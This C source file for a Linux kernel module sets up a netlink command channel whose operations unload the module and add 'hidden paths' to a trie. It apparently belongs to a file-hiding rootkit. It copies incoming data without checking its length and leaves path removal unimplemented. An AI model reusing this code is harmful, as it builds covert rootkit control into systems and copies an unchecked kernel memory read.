#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>

#include "../operations_ids.h"
#include "../msg_to_module.h"
#include "../msg_to_user.h"
//#include "communicate.h"
#include "chars_trie.h"

struct trie *trie = NULL;

extern void exit_my_module(void);

#define NETLINK_USER 31
struct sock *nl_sk = NULL;

void my_recv_msg(struct sk_buff *skb) {
    if (trie == NULL)
        trie = create_trie();

    struct nlmsghdr *nlh = (struct nlmsghdr *) skb->data;

    int sender_pid = nlh->nlmsg_pid; /* pid of sending process_access */
    char *netlink_data = (char *) nlmsg_data(nlh);

    // todo can probably just get the whole struct at once
    OPER_ID oper_id = *((OPER_ID *) netlink_data);
    char oper_data[MAX_MSG_SIZE];
    memset(oper_data, '\x00', MAX_MSG_SIZE);
    memcpy((void *) oper_data, (void *) (netlink_data + sizeof(OPER_ID)), MAX_MSG_SIZE);

    switch (oper_id) {
        case OPER_EXIT_MODULE: {
            exit_my_module();
            return;
        }
        case OPER_ADD_HIDDEN_PATH: {
            add_word(trie, oper_data);
            printk(KERN_INFO
            "add hidden path: %s\n", oper_data);
            break;
        }
        case OPER_REMOVE_HIDDEN_PATH: {
            printk(KERN_INFO
            "remove hidden path: %s\n", oper_data);
            break;
        }
    }

//    printk(KERN_INFO
//    "Netlink received msg from pid(%d): %s\n", sender_pid, data);
}

void my_send_msg(int pid, char *msg) {
    struct msg_to_user my_msg;
    memset((void *) &my_msg, '\x00', sizeof(struct msg_to_user));
    strncpy(my_msg.data, msg, strlen(msg));

    int msg_size = sizeof(struct msg_to_user);

    struct sk_buff *skb_out = nlmsg_new(msg_size, 0);
    if (!skb_out) {
        printk(KERN_ERR
        "Failed to allocate new skb\n");
        return;
    }

    struct nlmsghdr *nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */

    strncpy((char *) nlmsg_data(nlh), (void *) &my_msg, msg_size);

    int res = nlmsg_unicast(nl_sk, skb_out, pid);
    if (res < 0)
        printk(KERN_INFO
    "Error while sending back to user\n");
}

int setup_my_channel(void) {
    struct netlink_kernel_cfg cfg = {
            .input = my_recv_msg,
    };

    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk) {
        printk(KERN_ALERT
        "Error creating socket.\n");
        return -1;
    }

    return 0;
}

void close_my_channel(void) {
    netlink_kernel_release(nl_sk);
}

